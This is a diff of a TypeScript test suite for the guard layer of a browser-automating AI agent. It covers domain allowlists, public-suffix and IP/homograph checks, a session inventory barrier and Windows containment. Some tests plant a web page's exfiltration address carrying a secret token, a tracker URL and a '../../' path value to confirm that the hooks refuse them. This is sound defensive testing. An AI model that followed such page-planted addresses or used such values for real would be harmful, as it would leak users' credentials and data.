+    const q0 = queueRig();
+    ownerKeygen("owner-9", join(q0.root, "k"), "a long test passphrase");
+    let err: any = null;
+    try { signAllowlistFile(q0.write("e.json", [base, { ...base, domains: ["example.com"] }]), join(q0.root, "k", "owner-key.pem"), "a long test passphrase", "owner-9"); } catch (e) { err = e; }
+    expect(err).toMatchObject({ code: "allowlist_domains_missing" });
+    expect(err.detail).toMatch(/^entry 1: name "domains"/);
+    // At preflight: a run with an allowlist whose entry lacks domains closes the job as allowlist_unverified, without a session.
+    const { q, id } = oneJob();
+    q.allow([{ ...base, url: "https://example.com/account/settings" } as Allow]);   // signed by the owner's key, but with no domains
+    const before = q.launches.length;
+    expect(await run(q.opts(attended))).toMatchObject({ code: "idle", closed: [id] });
+    expect(result(q, id)).toMatchObject({ status: "refused", code: "allowlist_unverified" });
+    expect(q.launches.length).toBe(before);
+    // Coverage: the pin's host, the site and each sign-in host must be allowed; a ".host" sign-in entry needs *.host and host.
     expect(signed([{ ...base, domains: ["other.com"] }]).ok).toBe(false);
     expect(signed([{ ...base, login_hosts: ["accounts.example.net"], domains: ["example.com"] }]).ok).toBe(false);
-    expect(signed([{ ...base, domains: ["www.example.com"] }]).ok).toBe(false);
-    expect(signed([{ ...base, domains: [] }]).ok).toBe(false);
-    expect(signed([{ ...base, query: false }]).ok).toBe(false);
-    expect(riskyEntry({ ...base, query: true })).toBe("query");
-    expect(riskyEntry({ ...base, query: true, reviewed: true })).toBeNull();
-    // The hook: another registrable domain is refused before the exact list, and the log keeps no address.
+    expect(signed([{ ...base, login_hosts: ["accounts.example.net"], domains: ["example.com", "accounts.example.net"] }]).ok).toBe(true);
+    expect(signed([{ ...base, login_hosts: [".example.net"], domains: ["example.com", "example.net"] }]).ok).toBe(false);
+    expect(signed([{ ...base, login_hosts: [".example.net"], domains: ["example.com", "example.net", "*.example.net"] }]).ok).toBe(true);
+    // A pattern is an exact host or an explicit wildcard over a host with a registrable domain: never a public suffix, an IP, a trailing dot or a bare star.
+    for (const bad of [["example.com", "*.com"], ["example.com", "*.co.uk"], ["example.com", "*.github.io"], ["example.com", "github.io"], ["example.com", "127.0.0.1"],
+      ["example.com", "example.org."], ["example.com", "*"], ["example.com", "a.*.example.com"], ["example.com", "*.xn--80ak6aa92e.com"]])
+      expect([bad, signed([{ ...base, domains: bad }]).ok]).toEqual([bad, false]);
+    expect(signed([{ ...base, domains: ["example.com", "*.example.com", "xn--80ak6aa92e.com"] }]).ok).toBe(true);
+    // The old "query": true is gone; query_params names the parameter names and needs review to sign.
+    expect(signed([{ ...base, domains: ["example.com"], query: true }]).ok).toBe(false);
+    expect(signed([{ ...base, domains: ["example.com"], query_params: ["tab", "page*"] }]).ok).toBe(true);
+    expect(signed([{ ...base, domains: ["example.com"], query_params: [] }]).ok).toBe(false);
+    expect(riskyEntry({ ...base, domains: ["example.com"], query_params: ["tab"] })).toBe("query");
+    expect(riskyEntry({ ...base, domains: ["example.com"], query_params: ["tab"], reviewed: true })).toBeNull();
+    // The entry's domains are its own patterns, as signed; nothing is derived from the site or the job.
+    const pin: Allow = { ...base, match: "prefix", url: "https://example.com/account", domains: ["example.com", "*.example.com", "accounts.example.net"] } as Allow;
+    expect(entryDomains(pin)).toEqual(["*.example.com", "accounts.example.net", "example.com"]);
+    expect(entryRegistrable(pin)).toEqual(["example.com", "example.net"]);
+    // A job whose hosts aren't all inside the entry's: refused (a host differing only in subdomain, or only in public suffix).
+    const exactPin: Allow = { ...base, match: "prefix", url: "https://example.com/account", domains: ["example.com"] } as Allow;
+    expect(jobScopeProblem(job({ start_url: "https://example.com/account/settings" }), exactPin)).toBeNull();
+    expect(jobScopeProblem(job({ start_url: "https://www.example.com/account/settings" }), exactPin)).toBe("domain_not_allowed");
+    expect(jobScopeProblem(job({ site: "example.co.uk", start_url: "https://example.co.uk/account" }), exactPin)).toBe("domain_not_allowed");
+    expect(jobScopeProblem(job({ site: "example.net", start_url: "https://example.net/account" }), exactPin)).toBe("domain_not_allowed");
+    expect(jobScopeProblem(job({ start_url: "https://www.example.com/account/settings" }), { ...exactPin, domains: ["example.com", "*.example.com"] })).toBeNull();
+    // The worker refuses it before any session: an entry whose pin matches but whose domains leave the job's host out
+    // (only possible past the signing check, so here the entry is built by hand) closes the job with domain_not_allowed.
+    expect(blocker(job({ start_url: "https://www.example.com/account/settings" }), { ok: true, value: [{ ...exactPin, url: "https://www.example.com/account", site: "example.com" }] }))
+      .toEqual({ status: "refused", code: "domain_not_allowed" });
+    expect(blocker(job(), { ok: true, value: [exactPin] })).toBeNull();
+    // The run's session gets exactly the entry's patterns, and its instruction names them.
+    const r2 = oneJob();
+    r2.q.allow([{ site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact", domains: ["example.com", "*.example.com"] }]);
+    expect(await run(r2.q.opts(attended))).toMatchObject({ code: "ok" });
+    const env = r2.q.envs.at(-1)!;
+    expect(JSON.parse(env.PCW_NAV_DOMAINS)).toEqual(["*.example.com", "example.com"]);
+  });
+
+  test("hosts are parsed by the URL parser first, matched against the pinned Public Suffix List, and every IP literal, trailing dot, IDN homograph and shared-hosting sibling is refused", () => {
+    // The list is the pinned one, private section included.
+    const text = readFileSync(join(OPT, "pcjobs/public_suffix_list.dat"), "utf8").replace(/\r\n/g, "\n");
+    expect(createHash("sha256").update(text, "utf8").digest("hex")).toBe(PSL_SHA256);
+    expect(text).toContain("===BEGIN PRIVATE DOMAINS===");
+    expect(WORKER_CODE).toContain(PSL_FILE);
+    // Registrable domains by the list: ICANN two-part suffixes, private shared hosting, wildcards and exceptions.
+    for (const [host, want] of [["a.b.example.co.uk", "example.co.uk"], ["example.com", "example.com"], ["www.example.com", "example.com"],
+      ["alice.github.io", "alice.github.io"], ["x.alice.github.io", "alice.github.io"], ["github.io", null], ["co.uk", null], ["com", null],
+      ["foo.bar.ck", "foo.bar.ck"], ["www.ck", "www.ck"], ["example.com.", null], ["127.0.0.1", null], ["", null]] as const)
+      expect([host, registrableDomain(host)]).toEqual([host, want]);
+    // A list that doesn't match its pinned hash fails closed: nothing has a registrable domain.
+    const dir = mkdtempSync(join(tmpdir(), "psl-"));
+    writeFileSync(join(dir, "psl.dat"), text + "\nevil.example\n");
+    expect(pslText(join(dir, "psl.dat"))).toBeNull();
+    expect(registrableDomain("example.com", null)).toBeNull();
+    const sc = { domains: ["example.com", "alice.github.io", "xn--80ak6aa92e.com"], canary: ["http://127.0.0.1:5000/pcw/tok"], query: [] as string[] };
+    // Every IP-literal form, as the parser normalizes it: refused, by address.
+    for (const [url, why] of [["http://2130706433/", "private_address"], ["http://0x7f.1/", "private_address"], ["http://0177.0.0.1/", "private_address"],
+      ["http://[::ffff:127.0.0.1]/", "private_address"], ["http://[::ffff:7f00:1]:5000/pcw/tok", "private_address"], ["http://3627733538/", "ip_address"],
+      ["http://[2606:4700::1]/", "ip_address"], ["http://8.8.8.8/", "ip_address"]] as const)
+      expect([url, addressScope(url, sc)]).toEqual([url, why]);
+    // The check page is matched by scheme, address, port and path: its page and the pages under it, nothing else on 127.0.0.1.
+    expect(addressScope("http://127.0.0.1:5000/pcw/tok", sc)).toBeNull();
+    expect(addressScope("http://127.0.0.1:5000/pcw/tok/chore/1", sc)).toBeNull();
+    expect(addressScope("http://127.0.0.1:5000/pcw/tokx", sc)).toBe("private_address");
+    expect(addressScope("http://127.0.0.1:5000/other", sc)).toBe("private_address");
+    expect(addressScope("http://127.0.0.1:5001/pcw/tok", sc)).toBe("private_address");
+    expect(addressScope("https://127.0.0.1:5000/pcw/tok", sc)).toBe("private_address");
+    expect(addressScope("http://2130706433:5000/pcw/tok", sc)).toBeNull();          // the same address, however written
+    expect(onCanary(new URL("http://u:p@127.0.0.1:5000/pcw/tok"), sc.canary)).toBe(false);
+    // A trailing dot: refused, even on an allowed host.
+    expect(addressScope("https://example.com./account", sc)).toBe("trailing_dot");
+    // An IDN homograph of an allowed host (a Cyrillic a): the parser makes it punycode, which no pattern names exactly.
+    expect(new URL("https://ex\u0430mple.com/").hostname).toMatch(/^xn--/);
+    expect(addressScope("https://ex\u0430mple.com/account", sc)).toBe("idn_not_allowed");
+    expect(addressScope("https://ex\u0430mple.com/account", { ...sc, domains: ["*.com", "example.com"] })).toBe("idn_not_allowed");
+    // The entry's own IDN host, exactly, passes; the same under a wildcard doesn't.
+    expect(addressScope("https://xn--80ak6aa92e.com/a", sc)).toBeNull();
+    expect(hostAllowed("sub.xn--80ak6aa92e.com", ["*.xn--80ak6aa92e.com"])).toBe(false);
+    // A shared-hosting sibling: another github.io site is another registrable domain.
+    expect(addressScope("https://alice.github.io/x", sc)).toBeNull();
+    expect(addressScope("https://mallory.github.io/x", sc)).toBe("domain_not_allowed");
+    expect(addressScope("https://github.io/x", sc)).toBe("domain_not_allowed");
+    // Differing only in subdomain or public suffix.
+    expect(addressScope("https://www.example.com/x", sc)).toBe("domain_not_allowed");
+    expect(addressScope("https://example.co.uk/x", sc)).toBe("domain_not_allowed");
+    expect(addressScope("https://example.com.evil.net/x", sc)).toBe("domain_not_allowed");
+    // A query passes only with parameter patterns, every name matching; a fragment never.
+    const qs = { ...sc, query: ["tab", "page*"] };
+    expect(addressScope("https://example.com/a?d=x", sc)).toBe("query_not_allowed");
+    expect(addressScope("https://example.com/a?", sc)).toBe("query_not_allowed");
+    expect(addressScope("https://example.com/a?tab=1&page2=3", qs)).toBeNull();
+    expect(addressScope("https://example.com/a?tab=1&d=secret", qs)).toBe("query_not_allowed");
+    expect(addressScope("https://example.com/a#x", qs)).toBe("fragment_not_allowed");
+    expect(addressScope(`https://example.com/a?tab=${"x".repeat(QUERY_MAX)}`, qs)).toBe("query_too_long");
+    expect(queryAllowed("", undefined)).toBe(true);
+    // The hook logs a refused host's registrable domain and keyed hashes only.
     const evil = "https://collect.evil.example/c?d=secret-token-planted-by-the-page";
     expect(navDecide(nav(evil), JSON.stringify([evil]), undefined, { scope })).toMatchObject({ decision: "deny", why: "domain_not_allowed", url: null, domain: "evil.example" });
-    expect(navDecide(nav(evil, "t2", "tabs_create_mcp"), JSON.stringify([evil]), undefined, { scope }).why).toBe("domain_not_allowed");
-    // A query or fragment on an allowed domain: refused unless the entry allows them, and capped when it does.
-    expect(addressScope("https://example.com/account/settings?d=x", scope)).toBe("query_not_allowed");
-    expect(addressScope("https://example.com/account/settings#x", scope)).toBe("query_not_allowed");
-    expect(addressScope("https://example.com/account/settings?", scope)).toBe("query_not_allowed");
-    expect(addressScope("https://example.com/account/settings?d=x", { ...scope, query: true })).toBeNull();
-    expect(addressScope(`https://example.com/account/settings?d=${"x".repeat(QUERY_MAX)}`, { ...scope, query: true })).toBe("query_too_long");
-    // The scope as the session's environment gives it, and the fallback when it names none.
-    expect(scopeFromEnv({ PCW_NAV_ALLOW: JSON.stringify([`${CANARY}/pcw/x`, "https://a.example.org/x"]) })).toEqual({ domains: ["example.org"], canary: [CANARY], query: false });
-    expect(scopeOf([`${CANARY}/pcw`, "https://example.com/a", END_URL], ["example.com"], true)).toEqual({ domains: ["example.com"], canary: [CANARY], query: true });
-    // A run: the page plants the exfiltration address and the session tries it; the hook refuses it before it runs and the run fails.
+    // The scope as the session's environment gives it, and the fallback when it names none: exact hosts.
+    expect(scopeFromEnv({ PCW_NAV_ALLOW: JSON.stringify([`${CANARY}/pcw/x`, "https://a.example.org/x"]) })).toEqual({ domains: ["a.example.org"], canary: [`${CANARY}/pcw/x`], query: [] });
+    expect(scopeFromEnv({ PCW_NAV_ALLOW: "[]", PCW_NAV_QUERY: '["tab"]' }).query).toEqual(["tab"]);
+    expect(() => scopeFromEnv({ PCW_NAV_ALLOW: "[]", PCW_NAV_QUERY: "1" })).toThrow();
+  });
+
+  test("a page-planted address on another domain, with content in its query, is refused before the call and fails the run", async () => {
+    const evil = "https://collect.evil.example/c?d=secret-token-planted-by-the-page";
     const { q, id } = oneJob();
     const reached: string[] = [];
     q.runExtra(async (b) => { const r = await b.use("navigate", { tabId: b.group[0].id, url: evil }); if (r.ok) reached.push(evil); });
@@ -4435,56 +4568,101 @@ describe("thirteenth review: schemes and private addresses, the job's domains, t
     expect(readFileSync(join(q.home, "nav-decisions.jsonl"), "utf8")).not.toContain("secret-token");
   });
 
-  test("the inventory barrier: a session that prints its init event and at once tries an allowed tool is refused by the hook until the worker has recorded a passed inventory for that very session", async () => {
-    const home = mkdtempSync(join(tmpdir(), "pcbarrier-"));
-    const marker = join(home, "inventory-ok");
-    const log = join(home, "nav.jsonl");
-    const script = join(home, "cli.ts");
-    // A stand-in CLI: it calls the real hook once before its init event, prints the init event, calls the hook again at once,
-    // then waits for the marker (or two seconds) and calls it a third time. Each hook answer is printed as a line.
-    writeFileSync(script, `const { spawnSync } = require("node:child_process"); const fs = require("node:fs");
-const hook = (id) => spawnSync(process.execPath, [${JSON.stringify(join(OPT, "pcjobs/worker.ts"))}, "nav-guard"], { input: JSON.stringify({ session_id: process.env.SID, tool_use_id: id, tool_name: "${CH}get_page_text", tool_input: { tabId: 1 } }), env: process.env, encoding: "utf8" }).status;
+  test("the inventory barrier waits for the marker: a first call that arrives before the init event is allowed once the worker writes it, and one whose marker never comes is refused as not ready", async () => {
+    const home = mkdtempSync(join(tmpdir(), "pcjobs-barrier-"));
+    const dir = join(home, "inventory"), log = join(home, "nav.jsonl"), script = join(home, "cli.ts");
+    // A stand-in CLI: it starts the real hook for its first tool call before it prints its init event (the race print mode
+    // allows), prints the init event 300 ms later, and reports the hook's exit code and answer once it is back.
+    writeFileSync(script, `const { spawn } = require("node:child_process");
 const say = (o) => process.stdout.write(JSON.stringify(o) + "\\n");
-say({ type: "hook", id: "before", code: hook("before") });
-say({ type: "system", subtype: "init", session_id: process.env.SID, tools: process.env.TOOLS.split(","), mcp_servers: [{ name: "claude-in-chrome", status: "connected" }] });
-say({ type: "hook", id: "at_once", code: hook("at_once") });
-const end = Date.now() + 2000; while (!fs.existsSync(${JSON.stringify(marker)}) && Date.now() < end) { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 20); }
-say({ type: "hook", id: "after", code: hook("after") });
-say({ type: "result", subtype: "success", result: "done" });`);
-    const go = async (sid: string, tools: string[], ok: boolean) => {
-      rmSync(marker, { force: true }); rmSync(log, { force: true });
-      const env = cleanEnv({ PCW_NAV_ALLOW: "[]", PCW_NAV_LOG: log, PCW_INVENTORY_MARKER: marker, SID: sid, TOOLS: tools.join(",") });
-      const gate = markingGate({ home }, (init) => inventory({ init, uses: [], results: {}, denials: [], final: null }, READING.concat(NAVIGATING), []).ok === ok || ok, marker);
-      const s = await realLaunch([process.execPath, script], home, 30_000, env as Record<string, string>, undefined, ok ? gate : markingGate({ home }, () => false, marker));
-      return s.out.split("\n").filter(Boolean).map((l) => JSON.parse(l)).filter((e) => e.type === "hook").map((e) => [e.id, e.code]);
+const c = spawn(process.execPath, [${JSON.stringify(join(OPT, "pcjobs/worker.ts"))}, "nav-guard"], { env: process.env, stdio: ["pipe", "pipe", "ignore"] });
+let out = ""; c.stdout.on("data", (d) => { out += d; });
+c.stdin.end(JSON.stringify({ session_id: process.env.SID, tool_use_id: "first", tool_name: "${CH}get_page_text", tool_input: { tabId: 1 } }));
+setTimeout(() => say({ type: "system", subtype: "init", session_id: process.env.SID, tools: process.env.TOOLS.split(","), mcp_servers: [{ name: "claude-in-chrome", status: "connected" }] }), 300);
+c.on("close", (code) => { say({ type: "hook", id: "first", code, out }); say({ type: "result", subtype: "success", result: "done" }); });`);
+    // pass false: a gate that lets the session go on but never writes its marker (the worker failed to).
+    const go = async (sid: string, pass: boolean, more: Record<string, string> = {}) => {
+      rmSync(dir, { recursive: true, force: true }); rmSync(log, { force: true });
+      const env = cleanEnv({ PCW_NAV_ALLOW: "[]", PCW_NAV_LOG: log, PCW_INVENTORY_DIR: dir, PCW_RUN_NONCE: TNONCE, SID: sid, TOOLS: GIVEN.join(","), ...more });
+      const t0 = Date.now();
+      const s = await realLaunch([process.execPath, script], home, 30_000, env as Record<string, string>, undefined, markingGate({ home }, () => true, pass ? dir : undefined, TNONCE));
+      const hook = s.out.split("\n").filter(Boolean).map((l) => JSON.parse(l)).find((e) => e.type === "hook");
+      return { code: hook?.code, out: String(hook?.out ?? ""), ms: Date.now() - t0, d: readNavLog(log).find((x) => x.id === "first") };
     };
-    // A passing inventory: refused before the marker, allowed once the worker wrote it for this session.
-    const passed = await go("sess-barrier-0001", GIVEN, true);
-    expect(passed[0]).toEqual(["before", 2]);
-    expect(passed[2]).toEqual(["after", 0]);
-    expect(readNavLog(log).find((d) => d.id === "before")).toMatchObject({ decision: "deny", why: "inventory_unconfirmed" });
-    // A failing inventory: the session is ended at its init event and nothing it tries is ever allowed.
-    const failed = await go("sess-barrier-0002", [...GIVEN, "Bash"], false);
-    expect(failed.every(([, code]) => code !== 0)).toBe(true);
-    expect(existsSync(marker)).toBe(false);
-    // The marker names one session: a call from any other session id is refused.
-    writeFileSync(marker, "sess-barrier-0003\n");
-    expect(inventoryConfirmed({ PCW_INVENTORY_MARKER: marker }, JSON.stringify({ session_id: "sess-barrier-0003" }))).toBe(true);
-    expect(inventoryConfirmed({ PCW_INVENTORY_MARKER: marker }, JSON.stringify({ session_id: "sess-barrier-9999" }))).toBe(false);
-    expect(inventoryConfirmed({ PCW_INVENTORY_MARKER: marker }, JSON.stringify({}))).toBe(false);
-    expect(inventoryConfirmed({}, JSON.stringify({ session_id: "sess-barrier-0003" }))).toBe(false);
-    // The gate writes the marker only on a pass with a session id; an init without one, a failed check or a throw leaves it absent.
-    rmSync(marker, { force: true });
+    // The call came before the marker; the hook waited, the worker's gate wrote it on the init event, and the call ran.
+    const early = await go("sess-barrier-0001", true);
+    expect(early.code).toBe(0);
+    expect(early.d).toMatchObject({ decision: "allow", why: "reads" });
+    expect(readFileSync(markerPath(dir, "sess-barrier-0001"), "utf8").trim()).toBe(`sess-barrier-0001 ${TNONCE}`);
+    // The marker never comes: the hook waits its full five seconds, then refuses with the distinct not-ready answer.
+    const never = await go("sess-barrier-0002", false);
+    expect(never.code).toBe(2);
+    expect(never.d).toMatchObject({ decision: "deny", why: "inventory_not_ready" });
+    expect(JSON.parse(never.out).hookSpecificOutput.permissionDecisionReason).toBe(NOT_READY_MESSAGE);
+    expect(never.ms).toBeGreaterThanOrEqual(4_500);
+    expect(existsSync(markerPath(dir, "sess-barrier-0002"))).toBe(false);
+    // The not-ready refusal is a retry, never a trip: it doesn't count toward the tab-context order, and the guard calls it retried.
+    const a = (tool: string, id: string) => ({ id, tool, url: null, decision: "allow" as const, why: "x" });
+    const nr = (tool: string, id: string) => ({ id, tool, url: null, decision: "deny" as const, why: "inventory_not_ready" });
+    const owed = (tool: string, id: string) => ({ id, tool, url: null, decision: "deny" as const, why: "context_owed" });
+    const hist = [nr("tabs_context_mcp", "1"), a("tabs_context_mcp", "2"), a("tabs_create_mcp", "3"), owed("find", "4"), nr("find", "5"), owed("find", "6"), a("tabs_context_mcp", "7")];
+    expect(contextStreaks(hist, false)).toEqual({ owed: false, current: 0, longest: 2 });
+    const st = parseStream(stream([ev.init(GIVEN), ...hist.map((d) => ev.use(d.id, `${CH}${d.tool}`, { tabId: 1, url: d.tool === "tabs_create_mcp" ? "https://example.com/" : undefined }))]));
+    const g = guardCheck(st, [...hist.slice(0, 2), { ...hist[2], url: "https://example.com/" }, ...hist.slice(3)]);
+    expect(g).toMatchObject({ code: null, retried: ["1", "5"], denied: [] });
+  });
+
+  test("marker lifecycle: one marker per parsed session id in the walled worker folder, holding that session's nonce; cleared before, after and at startup; a leftover never admits a new session", async () => {
+    const q = queueRig();
+    const o = q.opts();
+    const env = sessionEnv(o, ["https://selftest.invalid/allowed"]);
+    const dir = env.PCW_INVENTORY_DIR;
+    // In the worker folder, which the wall names; the nonce is fresh for every session.
+    expect(resolve(dir).startsWith(resolve(q.home))).toBe(true);
+    expect(env.PCW_RUN_NONCE).toMatch(/^[0-9a-f]{32}$/);
+    expect(sessionEnv(o, ["https://selftest.invalid/allowed"]).PCW_RUN_NONCE).not.toBe(env.PCW_RUN_NONCE);
     const init = { tools: GIVEN, mcp: { "claude-in-chrome": "connected" }, version: null, extension_version: null };
-    expect(markingGate({ home }, () => true, marker)({ ...init, session_id: null })).toBe(false);
-    expect(markingGate({ home }, () => false, marker)({ ...init, session_id: "sess-barrier-0004" })).toBe(false);
-    expect(markingGate({ home }, () => { throw new Error("x"); }, marker)({ ...init, session_id: "sess-barrier-0004" })).toBe(false);
-    expect(markingGate({ home }, () => true, marker)(null)).toBe(false);
-    expect(existsSync(marker)).toBe(false);
-    expect(markingGate({ home }, () => true, marker)({ ...init, session_id: "sess-barrier-0004" })).toBe(true);
-    expect(readFileSync(marker, "utf8").trim()).toBe("sess-barrier-0004");
-    // A run removes the marker before and after its session; the preflight's self-test includes the barrier.
-    expect(SELFTEST_SESSION).toMatch(/^[A-Za-z0-9_-]{8,}$/);
+    const call = (sid: string) => JSON.stringify({ session_id: sid, tool_use_id: "t1", tool_name: `${CH}find` });
+    // Made only from the session id the gate parsed from the init event, and only on a pass.
+    expect(markingGate(o, () => true, dir, env.PCW_RUN_NONCE)({ ...init, session_id: "../../evil-path" })).toBe(false);
+    expect(markingGate(o, () => true, dir, env.PCW_RUN_NONCE)({ ...init, session_id: null })).toBe(false);
+    expect(markingGate(o, () => false, dir, env.PCW_RUN_NONCE)({ ...init, session_id: "sess-life-0001" })).toBe(false);
+    expect(markingGate(o, () => true, dir, "not-a-nonce")({ ...init, session_id: "sess-life-0001" })).toBe(false);
+    expect(existsSync(dir) ? readdirSync(dir) : []).toEqual([]);
+    expect(markingGate(o, () => true, dir, env.PCW_RUN_NONCE)({ ...init, session_id: "sess-life-0001" })).toBe(true);
+    expect(readdirSync(dir)).toEqual(["sess-life-0001"]);
+    expect(inventoryState(env, call("sess-life-0001"))).toBe("ok");
+    // A leftover from a previous session id never admits a new one: its file is that session's.
+    expect(inventoryState(env, call("sess-life-0002"))).toBe("absent");
+    // Nor a leftover with the same id from an earlier run: its nonce is that run's.
+    expect(inventoryState({ ...env, PCW_RUN_NONCE: "f".repeat(32) }, call("sess-life-0001"))).toBe("wrong");
+    expect(inventoryState({ ...env, PCW_RUN_NONCE: undefined }, call("sess-life-0001"))).toBe("wrong");
+    expect(inventoryState(env, JSON.stringify({}))).toBe("wrong");
+    // The hook refuses a wrong marker at once (no wait), as inventory_unconfirmed.
+    const log = join(q.root, "life.jsonl");
+    writeFileSync(markerPath(dir, "sess-life-0003"), `sess-life-0003 ${"e".repeat(32)}\n`);
+    const t0 = Date.now();
+    expect(await hookMain({ ...env, PCW_NAV_LOG: log }, async () => call("sess-life-0003"), () => {}, () => {})).toBe(2);
+    expect(Date.now() - t0).toBeLessThan(2_000);
+    expect(readNavLog(log).at(-1)).toMatchObject({ why: "inventory_unconfirmed" });
+    // Cleared at startup (the start sweep), and by the end step's cleanup.
+    expect(startSweep(o).code).toBeNull();
+    expect(existsSync(dir)).toBe(false);
+    markingGate(o, () => true, dir, env.PCW_RUN_NONCE)({ ...init, session_id: "sess-life-0004" });
+    clearMarkers(o);
+    expect(existsSync(dir)).toBe(false);
+    // A session: none before it starts, its own while it runs, none after it.
+    writeFileSync(markerPath((mkdirSync(dir, { recursive: true }), dir), "sess-life-0005"), `sess-life-0005 ${env.PCW_RUN_NONCE}\n`);
+    let during: string[] = [];
+    await runSession(q.opts({ launch: async (_a, _c, _m, e, _s, gate) => {
+      during.push(...(existsSync(dir) ? readdirSync(dir) : []));
+      gate!({ ...init, session_id: "sess-life-0006" });
+      during.push(...readdirSync(dir));
+      expect(inventoryState(e, call("sess-life-0006"))).toBe("ok");
+      return { code: 0, out: "", timedOut: false };
+    } }), ["claude"], 1_000, env, () => true);
+    expect(during).toEqual(["sess-life-0006"]);
+    expect(existsSync(dir)).toBe(false);
   });
 
   test("Windows containment: runs refuse without the Job Object helper, the session runs under it, and a cleanup failure names what holds the files", async () => {
@@ -4533,10 +4711,21 @@ say({ type: "result", subtype: "success", result: "done" });`);
     expect(helper).toBeTruthy();
     // Built once: a second call reuses it.
     expect(ensureJobHelper(o)).toBe(helper);
-    expect(spawnSync(helper!, ["version"], { encoding: "utf8" }).stdout.trim()).toBe("pcw-jobrun 1");
+    expect(spawnSync(helper!, ["version"], { encoding: "utf8" }).stdout.trim()).toBe("pcw-jobrun 2");
+    // The build record holds both hashes: the source's and the built executable's own.
+    const stamp = readStamp(join(home, "pcw-jobrun.sha256"))!;
+    expect(stamp.source_sha256).toBe(createHash("sha256").update(readFileSync(JOB_HELPER_SOURCE)).digest("hex"));
+    expect(stamp.exe_sha256).toBe(createHash("sha256").update(readFileSync(helper!)).digest("hex"));
+    // An executable that no longer matches its record (changed after the build) is rebuilt at the next preflight.
+    appendFileSync(helper!, Buffer.from([0]));
+    expect(containmentProblem(o)).toBeNull();
+    expect(createHash("sha256").update(readFileSync(helper!)).digest("hex")).toBe(readStamp(join(home, "pcw-jobrun.sha256"))!.exe_sha256);
+    // The compiler is the one under the system root.
+    expect(cscCandidates(process.env).some((c) => existsSync(c))).toBe(true);
     // The intermediary starts a burst of short children and one detached child, then exits at once: the child is gone after the helper exits.
+    // Then the helper itself is ended mid-run: its program and that program's detached child are gone after it.
     const line = await jobObjectCheck(o, helper);
-    expect(line).toEqual({ helper: true, descendant_started: true, descendant_left: false, passed: true });
+    expect(line).toEqual({ helper: true, descendant_started: true, descendant_left: false, kill_tree_gone: true, passed: true });
     // Exit codes pass through, and standard output reaches the worker.
     const r = spawnSync(helper!, ["run", process.execPath, "-e", "process.stdout.write('hi with \\\"quotes\\\" and spaces'); process.exit(7)"], { encoding: "utf8" });
     expect([r.status, r.stdout]).toEqual([7, 'hi with "quotes" and spaces']);
@@ -4599,7 +4788,7 @@ say({ type: "result", subtype: "success", result: "done" });`);
     expect(contextStreaks(spread, true)).toEqual({ owed: false, current: 0, longest: 1 });
     const ids = spread.map((d) => d.id);
     const st = parseStream(stream([ev.init(GIVEN), ...ids.map((id) => ev.use(id, `${CH}${spread[Number(id) - 1].tool}`, { tabId: 1 }))]));
-    expect(guardCheck(st, spread)).toMatchObject({ code: null, context_refusals: ["2", "5", "8", "11", "14"] });
+    expect(guardCheck(st, spread)).toMatchObject({ code: null, context_refusals: ["2", "5", "8", "11", "14"], retried: [], drifted: [] });
     // Two in a row, settled, then two more: still under three for any one owed context.
     const twos = [a("tabs_create_mcp", "1"), r("find", "2"), r("get_page_text", "3"), a("tabs_context_mcp", "4"), a("tabs_create_mcp", "5"), r("find", "6"), r("find", "7"), a("tabs_context_mcp", "8")];
     expect(contextStreaks(twos, false).longest).toBe(2);
@@ -4610,7 +4799,7 @@ say({ type: "result", subtype: "success", result: "done" });`);
     expect(guardCheck(parseStream(stream([ev.init(GIVEN), ...three.map((d) => ev.use(d.id, `${CH}${d.tool}`, { tabId: 1 }))])), three).code).toBe("tab_context_owed");
     // The hook's refusal message, as the model sees it.
     const dir = mkdtempSync(join(tmpdir(), "ctxmsg-"));
-    const env = { PCW_NAV_ALLOW: JSON.stringify([`${CANARY}/pcw/x`]), PCW_NAV_LOG: join(dir, "log.jsonl"), PCW_INVENTORY_MARKER: markerFor(dir) };
+    const env = { PCW_NAV_ALLOW: JSON.stringify([`${CANARY}/pcw/x`]), PCW_NAV_LOG: join(dir, "log.jsonl"), ...markerEnv(dir) };
     expect(await hookMain(env, async () => nav(`${CANARY}/pcw/x`, "c1", "tabs_create_mcp"), () => {}, () => {})).toBe(0);
     let said = "";
     expect(await hookMain(env, async () => JSON.stringify({ session_id: SID, tool_use_id: "c2", tool_name: `${CH}find`, tool_input: { tabId: 1 } }), (x) => { said += x; }, () => {})).toBe(2);
@@ -4717,5 +4906,169 @@ setTimeout(() => process.stdout.write(JSON.stringify({ type: "assistant", messag
     expect(out2.code).not.toBe("ok");
     round(q2.cfg);
     expect(JSON.stringify(readResult(q2.cfg.dir, q2.outcome(rid2).id))).not.toContain("evil.example");
+  });
+});
+
+describe("fourteenth review: the read-time drift check, what counts as a trip, the owner's reuse path, the Windows helper's build and its job", () => {
+  const CANARY_URL = "http://127.0.0.1:5000/pcw/tok";
+  const sc = { domains: ["example.com"], canary: [CANARY_URL], query: [] as string[] };
+  const readCall = (url: string | null, id = "r1", tool = "get_page_text") => JSON.stringify({ session_id: SID, tool_use_id: id, tool_name: `${CH}${tool}`, tool_input: { tabId: 1 },
+    tool_response: [{ type: "text", text: url === null ? "Title: t\n\nPage text." : `Title: t\nURL: ${url}\n\nPage text.` }] });
+
+  test("read-guard: a page read whose tab has left the job's sites is replaced before the model sees it, and logged with its domain and a keyed hash only", async () => {
+    const key = Buffer.alloc(32, 7);
+    expect(readDecide(readCall("https://example.com/account/settings"), sc)).toMatchObject({ decision: "allow", why: "read_on_scope", phase: "post" });
+    expect(readDecide(readCall(`${CANARY_URL}`), sc)).toMatchObject({ decision: "allow" });
+    expect(readDecide(readCall(END_URL), sc)).toMatchObject({ decision: "allow" });
+    expect(readDecide(readCall(null), sc)).toMatchObject({ decision: "allow", why: "read_unplaced" });
+    const off = readDecide(readCall("https://tracker.evil.example/landing?t=secret-token"), sc, key);
+    expect(off).toMatchObject({ id: "r1", tool: "get_page_text", url: null, decision: "deny", why: "read_drift", phase: "post", domain: "evil.example" });
+    expect(off.host_hmac).toBe(createHmac("sha256", key).update("tracker.evil.example").digest("hex"));
+    expect(JSON.stringify(off)).not.toContain("secret-token");
+    for (const bad of ["http://127.0.0.1:9/x", "https://www.example.com/x", "https://example.com./x", "file:///C:/x"]) expect([bad, readDecide(readCall(bad), sc).why]).toEqual([bad, "read_drift"]);
+    // The answer shapes Claude Code may hand it: content blocks, a string, an object holding content.
+    expect(responseText("URL: x")).toBe("URL: x");
